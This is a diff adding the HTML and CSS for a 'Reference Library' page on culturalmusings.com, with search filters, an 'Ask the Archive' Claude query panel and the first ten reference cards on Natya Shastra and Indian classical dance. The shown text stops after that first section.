@@ -1,0 +1,2077 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>📚 Reference Library — Grand Synthesis | Aesthetics of Society</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,600;1,300;1,400&family=Cinzel:wght@400;600;700&family=IM+Fell+English:ital@0;1&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --gold:       #c8922a;
+    --gold-light: #e8b84b;
+    --gold-pale:  #f5e6c0;
+    --ink:        #1a1208;
+    --ink-mid:    #2e1f0a;
+    --parchment:  #fdf6e3;
+    --parchment2: #f7ead0;
+    --rust:       #8b3a0f;
+    --sage:       #4a6741;
+    --deep-blue:  #1a2a4a;
+    --text:       #2e1f0a;
+    --muted:      #7a6245;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    font-family: 'Cormorant Garamond', Georgia, serif;
+    background-color: var(--parchment);
+    color: var(--text);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* ── TEXTURE OVERLAY ── */
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background-image:
+      url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='400'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='400' height='400' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 0;
+    opacity: 0.5;
+  }
+
+  /* ── HEADER ── */
+  header {
+    position: relative;
+    background: linear-gradient(160deg, var(--ink) 0%, var(--ink-mid) 55%, #3d2000 100%);
+    padding: 3.5rem 2rem 2.5rem;
+    text-align: center;
+    overflow: hidden;
+    border-bottom: 3px solid var(--gold);
+  }
+
+  header::before {
+    content: '';
+    position: absolute; inset: 0;
+    background:
+      radial-gradient(ellipse 80% 60% at 50% -10%, rgba(200,146,42,0.18) 0%, transparent 70%),
+      radial-gradient(ellipse 40% 80% at 10% 50%, rgba(200,146,42,0.06) 0%, transparent 60%);
+    pointer-events: none;
+  }
+
+  .header-om {
+    font-family: 'Cormorant Garamond', serif;
+    font-size: 2.8rem;
+    color: var(--gold);
+    opacity: 0.5;
+    letter-spacing: 0.1em;
+    margin-bottom: 0.4rem;
+    animation: breathe 4s ease-in-out infinite;
+  }
+
+  @keyframes breathe {
+    0%, 100% { opacity: 0.45; transform: scale(1); }
+    50%       { opacity: 0.7;  transform: scale(1.04); }
+  }
+
+  .header-site {
+    font-family: 'Cinzel', serif;
+    font-size: 0.72rem;
+    letter-spacing: 0.35em;
+    color: var(--gold-light);
+    opacity: 0.7;
+    text-transform: uppercase;
+    margin-bottom: 1rem;
+  }
+
+  header h1 {
+    font-family: 'Cinzel', serif;
+    font-size: clamp(1.6rem, 4vw, 2.8rem);
+    font-weight: 700;
+    color: var(--gold-pale);
+    letter-spacing: 0.08em;
+    line-height: 1.2;
+    margin-bottom: 0.6rem;
+  }
+
+  header h1 span { color: var(--gold-light); }
+
+  .header-sub {
+    font-family: 'IM Fell English', serif;
+    font-style: italic;
+    font-size: 1.1rem;
+    color: var(--gold);
+    opacity: 0.75;
+    margin-bottom: 1.4rem;
+  }
+
+  .header-divider {
+    display: flex; align-items: center; justify-content: center;
+    gap: 1rem; margin: 0 auto 1.2rem; max-width: 500px;
+  }
+  .header-divider span { flex: 1; height: 1px; background: linear-gradient(90deg, transparent, var(--gold), transparent); opacity: 0.5; }
+  .header-divider .lotus { color: var(--gold); font-size: 1.1rem; }
+
+  .header-stats {
+    display: flex; justify-content: center; gap: 2.5rem; flex-wrap: wrap;
+    margin-top: 0.5rem;
+  }
+  .stat {
+    display: flex; flex-direction: column; align-items: center;
+    gap: 0.2rem;
+  }
+  .stat-num {
+    font-family: 'Cinzel', serif;
+    font-size: 1.5rem; font-weight: 700;
+    color: var(--gold-light);
+  }
+  .stat-label {
+    font-size: 0.72rem; letter-spacing: 0.2em; text-transform: uppercase;
+    color: var(--gold); opacity: 0.6;
+  }
+
+  /* ── NAV BACK ── */
+  .back-bar {
+    background: var(--ink-mid);
+    padding: 0.55rem 2rem;
+    display: flex; align-items: center; gap: 0.6rem;
+    border-bottom: 1px solid rgba(200,146,42,0.25);
+    position: sticky; top: 0; z-index: 100;
+  }
+  .back-bar a {
+    font-family: 'Cinzel', serif;
+    font-size: 0.7rem; letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--gold); text-decoration: none;
+    opacity: 0.8; transition: opacity 0.2s;
+  }
+  .back-bar a:hover { opacity: 1; }
+  .back-sep { color: var(--gold); opacity: 0.4; font-size: 0.7rem; }
+
+  /* ── SEARCH & FILTER ── */
+  .controls {
+    max-width: 900px; margin: 2.5rem auto 0; padding: 0 1.5rem;
+    display: flex; flex-wrap: wrap; gap: 1rem; align-items: center;
+  }
+
+  .search-wrap {
+    flex: 1; min-width: 220px; position: relative;
+  }
+  .search-wrap input {
+    width: 100%;
+    font-family: 'Cormorant Garamond', serif;
+    font-size: 1rem;
+    background: rgba(255,255,255,0.55);
+    border: 1.5px solid var(--gold);
+    border-radius: 2px;
+    padding: 0.55rem 1rem 0.55rem 2.4rem;
+    color: var(--ink);
+    outline: none;
+    transition: border-color 0.2s, background 0.2s;
+  }
+  .search-wrap input:focus {
+    background: rgba(255,255,255,0.9);
+    border-color: var(--gold-light);
+  }
+  .search-wrap input::placeholder { color: var(--muted); opacity: 0.8; }
+  .search-icon {
+    position: absolute; left: 0.75rem; top: 50%; transform: translateY(-50%);
+    color: var(--gold); font-size: 0.9rem; pointer-events: none;
+  }
+
+  .filter-pills {
+    display: flex; flex-wrap: wrap; gap: 0.5rem;
+  }
+  .pill {
+    font-family: 'Cinzel', serif;
+    font-size: 0.62rem; letter-spacing: 0.18em; text-transform: uppercase;
+    padding: 0.35rem 0.85rem;
+    border: 1.5px solid var(--gold);
+    background: transparent;
+    color: var(--gold);
+    cursor: pointer; border-radius: 1px;
+    transition: all 0.2s;
+  }
+  .pill:hover, .pill.active {
+    background: var(--gold);
+    color: var(--ink);
+  }
+
+  .results-count {
+    font-family: 'IM Fell English', serif;
+    font-style: italic;
+    font-size: 0.88rem;
+    color: var(--muted);
+    max-width: 900px; margin: 0.8rem auto 0; padding: 0 1.5rem;
+  }
+
+  /* ── MODE SWITCHER ── */
+  .search-mode-bar {
+    max-width: 900px; margin: 2rem auto 0; padding: 0 1.5rem;
+    display: flex; align-items: stretch; gap: 0;
+    border: 1.5px solid rgba(200,146,42,0.4);
+    border-radius: 3px; overflow: hidden;
+  }
+  .mode-btn {
+    flex: 1;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    gap: 0.18rem;
+    padding: 0.9rem 1rem;
+    background: transparent;
+    border: none; cursor: pointer;
+    transition: background 0.25s;
+  }
+  .mode-btn:hover { background: rgba(200,146,42,0.08); }
+  .mode-btn.active { background: rgba(200,146,42,0.15); }
+  .mode-icon {
+    font-size: 1.3rem; color: var(--gold);
+    transition: transform 0.2s;
+  }
+  .mode-btn.active .mode-icon { transform: scale(1.15); }
+  .mode-label {
+    font-family: 'Cinzel', serif;
+    font-size: 0.72rem; letter-spacing: 0.18em; text-transform: uppercase;
+    color: var(--gold);
+  }
+  .mode-sub {
+    font-family: 'IM Fell English', serif;
+    font-style: italic; font-size: 0.72rem;
+    color: var(--muted);
+  }
+  .mode-divider {
+    display: flex; align-items: center;
+    color: var(--gold); opacity: 0.35;
+    font-size: 1rem; padding: 0 0.5rem;
+    border-left: 1px solid rgba(200,146,42,0.25);
+    border-right: 1px solid rgba(200,146,42,0.25);
+  }
+
+  /* ── API PANEL ── */
+  .api-panel {
+    max-width: 900px; margin: 1.2rem auto 0; padding: 0 1.5rem;
+  }
+  .api-search-wrap {
+    display: flex; gap: 0.7rem; align-items: flex-start;
+  }
+  .api-search-wrap textarea {
+    flex: 1;
+    font-family: 'Cormorant Garamond', serif;
+    font-size: 1.02rem; line-height: 1.5;
+    background: rgba(255,255,255,0.6);
+    border: 1.5px solid var(--gold);
+    border-radius: 2px;
+    padding: 0.65rem 1rem;
+    color: var(--ink);
+    resize: none; outline: none;
+    transition: background 0.2s, border-color 0.2s;
+  }
+  .api-search-wrap textarea:focus {
+    background: rgba(255,255,255,0.95);
+    border-color: var(--gold-light);
+  }
+  .api-search-wrap textarea::placeholder { color: var(--muted); opacity: 0.75; font-style: italic; }
+  .api-btn {
+    font-family: 'Cinzel', serif;
+    font-size: 0.7rem; letter-spacing: 0.2em; text-transform: uppercase;
+    padding: 0.7rem 1.3rem;
+    background: var(--gold);
+    border: none; border-radius: 2px;
+    color: var(--ink); cursor: pointer;
+    white-space: nowrap;
+    transition: background 0.2s, transform 0.1s;
+    align-self: stretch;
+  }
+  .api-btn:hover:not(:disabled) { background: var(--gold-light); }
+  .api-btn:active:not(:disabled) { transform: scale(0.97); }
+  .api-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+  .api-suggestions {
+    display: flex; flex-wrap: wrap; gap: 0.4rem; align-items: center;
+    margin-top: 0.6rem;
+  }
+  .sug-label {
+    font-family: 'IM Fell English', serif;
+    font-style: italic; font-size: 0.78rem;
+    color: var(--muted); margin-right: 0.2rem;
+  }
+  .sug-pill {
+    font-family: 'Cormorant Garamond', serif;
+    font-size: 0.78rem;
+    padding: 0.25rem 0.7rem;
+    border: 1px solid rgba(200,146,42,0.4);
+    background: transparent; color: var(--muted);
+    cursor: pointer; border-radius: 20px;
+    transition: all 0.2s;
+  }
+  .sug-pill:hover { background: rgba(200,146,42,0.12); color: var(--gold); border-color: var(--gold); }
+
+  /* ── API KEY ROW ── */
+  .api-key-row {
+    display: flex; align-items: center; flex-wrap: wrap;
+    gap: 0.6rem;
+    margin-top: 0.8rem;
+    padding: 0.6rem 0.9rem;
+    background: rgba(200,146,42,0.06);
+    border: 1px solid rgba(200,146,42,0.2);
+    border-radius: 2px;
+  }
+  .key-label {
+    font-family: 'Cinzel', serif;
+    font-size: 0.65rem; letter-spacing: 0.15em;
+    color: var(--gold); opacity: 0.8;
+    white-space: nowrap;
+  }
+  .api-key-row input {
+    flex: 1; min-width: 180px;
+    font-family: 'Cormorant Garamond', serif; font-size: 0.9rem;
+    background: rgba(255,255,255,0.5);
+    border: 1px solid rgba(200,146,42,0.3);
+    border-radius: 2px; padding: 0.3rem 0.7rem;
+    color: var(--ink); outline: none;
+  }
+  .api-key-row input:focus { background: white; border-color: var(--gold); }
+  .key-note {
+    font-family: 'IM Fell English', serif;
+    font-style: italic; font-size: 0.72rem;
+    color: var(--muted); opacity: 0.8;
+  }
+
+  /* ── API RESPONSE BOX ── */
+  .api-response-box {
+    margin-top: 1.2rem;
+    border: 1.5px solid rgba(200,146,42,0.35);
+    border-radius: 3px;
+    overflow: hidden;
+    animation: fadeUp 0.35s ease;
+  }
+  .api-response-header {
+    display: flex; align-items: center; gap: 0.6rem;
+    background: var(--ink-mid);
+    padding: 0.55rem 1rem;
+  }
+  .api-resp-icon { color: var(--gold-light); font-size: 1rem; }
+  .api-resp-title {
+    font-family: 'Cinzel', serif;
+    font-size: 0.65rem; letter-spacing: 0.2em; text-transform: uppercase;
+    color: var(--gold-pale); flex: 1;
+  }
+  .api-clear {
+    font-family: 'Cinzel', serif; font-size: 0.6rem; letter-spacing: 0.1em;
+    background: transparent; border: 1px solid rgba(200,146,42,0.3);
+    color: var(--gold); cursor: pointer; padding: 0.2rem 0.5rem; border-radius: 2px;
+    transition: all 0.2s;
+  }
+  .api-clear:hover { background: rgba(200,146,42,0.15); }
+  .api-response-body {
+    padding: 1.2rem 1.3rem;
+    background: rgba(253,246,227,0.97);
+    font-family: 'Cormorant Garamond', serif;
+    font-size: 1.02rem; line-height: 1.7;
+    color: var(--text);
+    white-space: pre-wrap;
+  }
+  .api-response-body .thinking {
+    font-style: italic; color: var(--muted); opacity: 0.7;
+    display: flex; align-items: center; gap: 0.5rem;
+  }
+  .dot-pulse { display: inline-flex; gap: 4px; }
+  .dot-pulse span {
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--gold); opacity: 0.6;
+    animation: pulse 1.2s ease-in-out infinite;
+  }
+  .dot-pulse span:nth-child(2) { animation-delay: 0.2s; }
+  .dot-pulse span:nth-child(3) { animation-delay: 0.4s; }
+  @keyframes pulse { 0%,80%,100%{transform:scale(0.6);opacity:0.4} 40%{transform:scale(1);opacity:1} }
+
+  /* ── MAIN CONTENT ── */
+  main {
+    max-width: 900px; margin: 2rem auto 4rem; padding: 0 1.5rem;
+    position: relative; z-index: 1;
+  }
+
+  /* ── SECTION ── */
+  .section {
+    margin-bottom: 3rem;
+    opacity: 0; transform: translateY(20px);
+    animation: fadeUp 0.5s ease forwards;
+  }
+  @keyframes fadeUp {
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .section-header {
+    display: flex; align-items: center; gap: 1rem;
+    margin-bottom: 1.2rem;
+    padding-bottom: 0.7rem;
+    border-bottom: 1px solid rgba(200,146,42,0.35);
+  }
+  .section-icon { font-size: 1.4rem; }
+  .section-title {
+    font-family: 'Cinzel', serif;
+    font-size: 1rem; font-weight: 600;
+    letter-spacing: 0.15em; text-transform: uppercase;
+    color: var(--gold);
+  }
+  .section-count {
+    margin-left: auto;
+    font-family: 'Cormorant Garamond', serif;
+    font-size: 0.85rem; font-style: italic;
+    color: var(--muted);
+  }
+
+  /* ── REFERENCE CARD ── */
+  .ref-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+    gap: 1px;
+    background: rgba(200,146,42,0.15);
+    border: 1px solid rgba(200,146,42,0.25);
+  }
+
+  .ref-card {
+    background: rgba(253,246,227,0.85);
+    padding: 1.1rem 1.2rem;
+    transition: background 0.2s;
+    display: flex; flex-direction: column; gap: 0.35rem;
+  }
+  .ref-card:hover { background: rgba(248,234,196,0.98); }
+  .ref-card.hidden { display: none; }
+
+  .ref-num {
+    font-family: 'Cinzel', serif;
+    font-size: 0.6rem; letter-spacing: 0.2em;
+    color: var(--gold); opacity: 0.7;
+  }
+  .ref-title {
+    font-family: 'Cormorant Garamond', serif;
+    font-size: 0.97rem; font-weight: 600;
+    color: var(--ink); line-height: 1.35;
+  }
+  .ref-author {
+    font-family: 'IM Fell English', serif;
+    font-style: italic; font-size: 0.82rem;
+    color: var(--muted);
+  }
+  .ref-domain {
+    font-family: 'Cinzel', serif;
+    font-size: 0.58rem; letter-spacing: 0.15em; text-transform: uppercase;
+    color: var(--rust); opacity: 0.8;
+    margin-top: 0.1rem;
+  }
+  .ref-link {
+    font-size: 0.78rem;
+    color: var(--deep-blue);
+    text-decoration: none;
+    word-break: break-all;
+    opacity: 0.75;
+    transition: opacity 0.2s, color 0.2s;
+  }
+  .ref-link:hover { opacity: 1; color: var(--rust); }
+
+  .no-results {
+    font-family: 'IM Fell English', serif;
+    font-style: italic; font-size: 1.1rem;
+    color: var(--muted); text-align: center;
+    padding: 3rem 1rem; display: none;
+  }
+
+  /* ── VISIT SOURCE BUTTON ── */
+  .ref-actions {
+    display: flex; gap: 0.4rem; margin-top: 0.4rem; flex-wrap: wrap;
+  }
+  .btn-visit {
+    font-family: 'Cinzel', serif;
+    font-size: 0.58rem; letter-spacing: 0.14em; text-transform: uppercase;
+    padding: 0.28rem 0.65rem;
+    background: transparent;
+    border: 1px solid rgba(200,146,42,0.5);
+    color: var(--gold); cursor: pointer; border-radius: 1px;
+    transition: all 0.18s;
+  }
+  .btn-visit:hover { background: var(--gold); color: var(--ink); }
+  .btn-websearch {
+    font-family: 'Cinzel', serif;
+    font-size: 0.58rem; letter-spacing: 0.14em; text-transform: uppercase;
+    padding: 0.28rem 0.65rem;
+    background: transparent;
+    border: 1px solid rgba(26,42,74,0.35);
+    color: var(--deep-blue); cursor: pointer; border-radius: 1px;
+    transition: all 0.18s; text-decoration: none;
+  }
+  .btn-websearch:hover { background: var(--deep-blue); color: #fff; }
+
+  /* ── SOURCE DRAWER ── */
+  #sourceDrawer {
+    position: fixed; inset: 0;
+    z-index: 1000;
+    display: none;
+  }
+  #sourceDrawer.open { display: flex; }
+  .drawer-backdrop {
+    position: absolute; inset: 0;
+    background: rgba(26,18,8,0.65);
+    backdrop-filter: blur(3px);
+    cursor: pointer;
+  }
+  .drawer-panel {
+    position: absolute;
+    right: 0; top: 0; bottom: 0;
+    width: min(680px, 100vw);
+    background: var(--parchment);
+    display: flex; flex-direction: column;
+    box-shadow: -4px 0 32px rgba(0,0,0,0.35);
+    transform: translateX(100%);
+    transition: transform 0.32s cubic-bezier(0.4,0,0.2,1);
+  }
+  #sourceDrawer.open .drawer-panel { transform: translateX(0); }
+  .drawer-head {
+    background: var(--ink);
+    padding: 0.75rem 1rem;
+    display: flex; align-items: center; gap: 0.7rem;
+    border-bottom: 2px solid var(--gold);
+    flex-shrink: 0;
+  }
+  .drawer-ref-num {
+    font-family: 'Cinzel', serif; font-size: 0.6rem;
+    letter-spacing: 0.2em; color: var(--gold); opacity: 0.7;
+  }
+  .drawer-title {
+    font-family: 'Cormorant Garamond', serif; font-size: 0.95rem; font-weight: 600;
+    color: var(--gold-pale); flex: 1; line-height: 1.3;
+  }
+  .drawer-close {
+    background: transparent; border: 1px solid rgba(200,146,42,0.3);
+    color: var(--gold); cursor: pointer; padding: 0.3rem 0.6rem;
+    font-family: 'Cinzel', serif; font-size: 0.6rem; letter-spacing: 0.1em;
+    border-radius: 1px; transition: all 0.18s; flex-shrink: 0;
+  }
+  .drawer-close:hover { background: rgba(200,146,42,0.2); }
+  .drawer-toolbar {
+    background: var(--ink-mid);
+    padding: 0.5rem 1rem;
+    display: flex; align-items: center; gap: 0.6rem;
+    flex-shrink: 0; flex-wrap: wrap;
+  }
+  .drawer-url {
+    font-family: 'Cormorant Garamond', serif; font-size: 0.8rem;
+    color: var(--gold-pale); opacity: 0.6;
+    flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+    min-width: 0;
+  }
+  .drawer-open-new {
+    font-family: 'Cinzel', serif; font-size: 0.58rem; letter-spacing: 0.14em;
+    text-transform: uppercase; text-decoration: none;
+    padding: 0.28rem 0.7rem;
+    background: var(--gold); color: var(--ink);
+    border-radius: 1px; white-space: nowrap; flex-shrink: 0;
+    transition: background 0.18s;
+  }
+  .drawer-open-new:hover { background: var(--gold-light); }
+  .drawer-google {
+    font-family: 'Cinzel', serif; font-size: 0.58rem; letter-spacing: 0.14em;
+    text-transform: uppercase; text-decoration: none;
+    padding: 0.28rem 0.7rem;
+    background: transparent; color: var(--gold);
+    border: 1px solid rgba(200,146,42,0.4);
+    border-radius: 1px; white-space: nowrap; flex-shrink: 0;
+    transition: all 0.18s;
+  }
+  .drawer-google:hover { background: rgba(200,146,42,0.15); }
+  .drawer-body {
+    flex: 1; position: relative; overflow: hidden;
+  }
+  .drawer-body iframe {
+    width: 100%; height: 100%;
+    border: none;
+  }
+  .drawer-loading {
+    position: absolute; inset: 0;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    gap: 1rem; background: var(--parchment);
+    font-family: 'IM Fell English', serif;
+    font-style: italic; color: var(--muted);
+  }
+  .drawer-blocked {
+    position: absolute; inset: 0;
+    display: none; flex-direction: column;
+    align-items: center; justify-content: center;
+    gap: 1.2rem; padding: 2rem; text-align: center;
+    background: var(--parchment);
+  }
+  .drawer-blocked .blocked-icon { font-size: 2.5rem; opacity: 0.4; }
+  .drawer-blocked .blocked-title {
+    font-family: 'Cinzel', serif; font-size: 0.85rem; letter-spacing: 0.15em;
+    text-transform: uppercase; color: var(--gold);
+  }
+  .drawer-blocked .blocked-note {
+    font-family: 'IM Fell English', serif; font-style: italic;
+    font-size: 0.92rem; color: var(--muted); max-width: 340px; line-height: 1.6;
+  }
+  .drawer-blocked .blocked-actions {
+    display: flex; gap: 0.7rem; flex-wrap: wrap; justify-content: center;
+  }
+  .drawer-blocked .ba-btn {
+    font-family: 'Cinzel', serif; font-size: 0.62rem; letter-spacing: 0.15em;
+    text-transform: uppercase; text-decoration: none;
+    padding: 0.45rem 1rem; border-radius: 1px; transition: all 0.18s;
+  }
+  .ba-btn-gold { background: var(--gold); color: var(--ink); }
+  .ba-btn-gold:hover { background: var(--gold-light); }
+  .ba-btn-outline { border: 1px solid var(--gold); color: var(--gold); background: transparent; }
+  .ba-btn-outline:hover { background: rgba(200,146,42,0.12); }
+
+  /* ── FOOTER ── */
+  footer {
+    background: var(--ink);
+    border-top: 2px solid var(--gold);
+    padding: 2rem;
+    text-align: center;
+    color: var(--gold);
+    opacity: 0.85;
+  }
+  footer .f-logo {
+    font-family: 'Cinzel', serif;
+    font-size: 0.75rem; letter-spacing: 0.3em;
+    text-transform: uppercase; margin-bottom: 0.5rem;
+  }
+  footer .f-note {
+    font-family: 'IM Fell English', serif;
+    font-style: italic; font-size: 0.82rem;
+    color: var(--gold-pale); opacity: 0.5;
+  }
+
+  @media (max-width: 600px) {
+    .header-stats { gap: 1.2rem; }
+    .ref-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- BACK NAV -->
+<div class="back-bar">
+  <a href="https://www.culturalmusings.com">⬅ Aesthetics of Society</a>
+  <span class="back-sep">·</span>
+  <a href="https://www.culturalmusings.com">culturalmusings.com</a>
+</div>
+
+<!-- HEADER -->
+<header>
+  <div class="header-om">ॐ</div>
+  <div class="header-site">Aesthetics of Society · culturalmusings.com</div>
+  <h1>📚 <span>Reference</span> Library</h1>
+  <p class="header-sub">All external sources indexed across the Grand Synthesis project</p>
+  <div class="header-divider">
+    <span></span><span class="lotus">✦</span><span></span>
+  </div>
+  <div class="header-stats">
+    <div class="stat"><span class="stat-num" id="totalCount">56</span><span class="stat-label">Total Sources</span></div>
+    <div class="stat"><span class="stat-num">9</span><span class="stat-label">Domains</span></div>
+    <div class="stat"><span class="stat-num">5000+</span><span class="stat-label">Years of Wisdom</span></div>
+  </div>
+</header>
+
+<!-- SEARCH MODES -->
+<div class="search-mode-bar">
+  <button class="mode-btn active" id="modeLocal" onclick="switchMode('local')">
+    <span class="mode-icon">⌕</span>
+    <span class="mode-label">Browse Library</span>
+    <span class="mode-sub">Instant filter — no API</span>
+  </button>
+  <div class="mode-divider">✦</div>
+  <button class="mode-btn" id="modeApi" onclick="switchMode('api')">
+    <span class="mode-icon">✺</span>
+    <span class="mode-label">Ask the Archive</span>
+    <span class="mode-sub">Claude AI · Research queries</span>
+  </button>
+</div>
+
+<!-- LOCAL SEARCH PANEL -->
+<div class="controls" id="localPanel">
+  <div class="search-wrap">
+    <span class="search-icon">⌕</span>
+    <input type="text" id="searchInput" placeholder="Search by title, author, or domain…" oninput="filterRefs()">
+  </div>
+  <div class="filter-pills">
+    <button class="pill active" onclick="filterByTag('all', this)">All</button>
+    <button class="pill" onclick="filterByTag('natya', this)">Natya Shastra</button>
+    <button class="pill" onclick="filterByTag('nada', this)">Nada Chikitsa</button>
+    <button class="pill" onclick="filterByTag('vedic', this)">Vedic Science</button>
+    <button class="pill" onclick="filterByTag('neuro', this)">Neuroscience</button>
+    <button class="pill" onclick="filterByTag('sanskrit', this)">Sanskrit</button>
+    <button class="pill" onclick="filterByTag('astro', this)">Astro & Geometry</button>
+    <button class="pill" onclick="filterByTag('consciousness', this)">Consciousness</button>
+  </div>
+</div>
+<p class="results-count" id="resultsCount">Showing all 56 references</p>
+
+<!-- API SEARCH PANEL -->
+<div class="api-panel" id="apiPanel" style="display:none">
+  <div class="api-search-wrap">
+    <textarea id="apiQuery" placeholder="Ask a research question… e.g. 'Which sources connect Nada Chikitsa with neuroscience?' or 'Explain the relationship between Karanas and sacred geometry'" rows="2"></textarea>
+    <button class="api-btn" id="apiSubmit" onclick="askClaude()">
+      <span id="apiBtnText">Ask the Archive</span>
+    </button>
+  </div>
+  <div class="api-suggestions">
+    <span class="sug-label">Try asking:</span>
+    <button class="sug-pill" onclick="fillQuery('Which references bridge ancient Vedic science and modern neuroscience?')">Vedic ↔ Neuroscience bridges</button>
+    <button class="sug-pill" onclick="fillQuery('What are the best primary sources for the 108 Karanas?')">Primary Karana sources</button>
+    <button class="sug-pill" onclick="fillQuery('Summarise the references on consciousness and Kashmir Shaivism')">Consciousness & Shaivism</button>
+    <button class="sug-pill" onclick="fillQuery('Which sources discuss Sanskrit as a computational language?')">Sanskrit & computation</button>
+  </div>
+  <div class="api-response-box" id="apiResponse" style="display:none">
+    <div class="api-response-header">
+      <span class="api-resp-icon">✺</span>
+      <span class="api-resp-title">Archive Response</span>
+      <button class="api-clear" onclick="clearResponse()">✕ Clear</button>
+    </div>
+    <div class="api-response-body" id="apiResponseBody"></div>
+  </div>
+  <div class="api-key-row" id="apiKeyRow">
+    <span class="key-label">🔑 Anthropic API Key</span>
+    <input type="password" id="apiKeyInput" placeholder="sk-ant-…  (stored in session only)" />
+    <span class="key-note">Never saved. Session only.</span>
+  </div>
+</div>
+
+<!-- MAIN -->
+<main id="mainContent">
+  <div class="no-results" id="noResults">No references found. Try a different search or filter.</div>
+
+  <!-- SECTION 1 -->
+  <div class="section" style="animation-delay:0.05s" data-section="natya">
+    <div class="section-header">
+      <span class="section-icon">🎭</span>
+      <span class="section-title">Natya Shastra & Classical Dance</span>
+      <span class="section-count">10 sources</span>
+    </div>
+    <div class="ref-grid">
+
+      <div class="ref-card" data-tags="natya">
+        <span class="ref-num">REF · 001</span>
+        <span class="ref-title">The Nāṭyaśāstra of Bharatamuni — Complete Text</span>
+        <span class="ref-author">Bharata Muni; tr. Manomohan Ghosh</span>
+        <span class="ref-domain">Natya Shastra · Primary Source</span>
+        <a class="ref-link" href="https://www.wisdomlib.org/hinduism/book/the-natyashastra" target="_blank">wisdomlib.org/hinduism/book/the-natyashastra</a>
+      </div>
+
+      <div class="ref-card" data-tags="natya">
+        <span class="ref-num">REF · 002</span>
+        <span class="ref-title">Abhinavagupta's Abhinavabhāratī Commentary</span>
+        <span class="ref-author">Abhinavagupta; tr. K. Krishnamoorthy</span>
+        <span class="ref-domain">Natya Shastra · Commentary</span>
+        <a class="ref-link" href="https://www.wisdomlib.org/hinduism/book/abhinavabharati-chapter-1" target="_blank">wisdomlib.org — Abhinavabharati</a>
+      </div>
+
+      <div class="ref-card" data-tags="natya">
+        <span class="ref-num">REF · 003</span>
+        <span class="ref-title">The 108 Karanas of Bharatanatyam — A Study</span>
+        <span class="ref-author">Padma Subrahmanyam</span>
+        <span class="ref-domain">Natya Shastra · Karanas</span>
+        <a class="ref-link" href="https://www.sangeetnatak.gov.in" target="_blank">sangeetnatak.gov.in</a>
+      </div>
+
+      <div class="ref-card" data-tags="natya neuro">
+        <span class="ref-num">REF · 004</span>
+        <span class="ref-title">Neural Correlates of Rasa in Classical Indian Performance</span>
+        <span class="ref-author">Bhattacharya, S. et al. — Frontiers in Psychology</span>
+        <span class="ref-domain">Natya Shastra · Neuroscience</span>
+        <a class="ref-link" href="https://www.frontiersin.org/journals/psychology" target="_blank">frontiersin.org/journals/psychology</a>
+      </div>
+
+      <div class="ref-card" data-tags="natya">
+        <span class="ref-num">REF · 005</span>
+        <span class="ref-title">Nṛtta, Nṛtya, Nāṭya — The Triadic Theory of Indian Dance</span>
+        <span class="ref-author">Kapila Vatsyayan</span>
+        <span class="ref-domain">Natya Shastra · Theory</span>
+        <a class="ref-link" href="https://ignca.gov.in" target="_blank">ignca.gov.in — Indira Gandhi National Centre</a>
+      </div>
+
+      <div class="ref-card" data-tags="natya vedic">
+        <span class="ref-num">REF · 006</span>
+        <span class="ref-title">Karanas in Temple Sculpture — Chidambaram to Tanjavur</span>
+        <span class="ref-author">T.S. Parthasarathy, Sangeet Natak Akademi</span>
+        <span class="ref-domain">Natya Shastra · Iconography</span>
+        <a class="ref-link" href="https://www.sangeetnatak.gov.in/publications" target="_blank">sangeetnatak.gov.in/publications</a>
+      </div>
+
+      <div class="ref-card" data-tags="natya neuro">
+        <span class="ref-num">REF · 007</span>
+        <span class="ref-title">Kinematic Analysis of Bharatanatyam Postures</span>
+        <span class="ref-author">Rajagopalan, V. — Journal of Dance Medicine & Science</span>
+        <span class="ref-domain">Natya Shastra · Biomechanics</span>
+        <a class="ref-link" href="https://meridian.allenpress.com/jdms" target="_blank">meridian.allenpress.com/jdms</a>
+      </div>
+
+      <div class="ref-card" data-tags="natya">
+        <span class="ref-num">REF · 008</span>
+        <span class="ref-title">Hastas in Bharatanatyam — Hand Gestures as Language</span>
+        <span class="ref-author">Sruti Magazine Archive, Chennai</span>
+        <span class="ref-domain">Natya Shastra · Mudra</span>
+        <a class="ref-link" href="https://www.sruti.com" target="_blank">sruti.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="natya astro">
+        <span class="ref-num">REF · 009</span>
+        <span class="ref-title">The 27 Nakshatras & Their Choreographic Resonance</span>
+        <span class="ref-author">Naredla Rama Chandra — culturalmusings.com</span>
+        <span class="ref-domain">Natya Shastra · Celestial Synthesis</span>
+        <a class="ref-link" href="https://completecelestialsynthesis.culturalmusings.com" target="_blank">completecelestialsynthesis.culturalmusings.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="natya vedic">
+        <span class="ref-num">REF · 010</span>
+        <span class="ref-title">Sacred Geometry of the Karana — Sri Chakra Correspondences</span>
+        <span class="ref-author">Naredla Rama Chandra — culturalmusings.com</span>
+        <span class="ref-domain">Natya Shastra · Sacred Geometry</span>
+        <a class="ref-link" href="https://domainsacredgeometry.culturalmusings.com" target="_blank">domainsacredgeometry.culturalmusings.com</a>
+      </div>
+
+    </div>
+  </div>
+
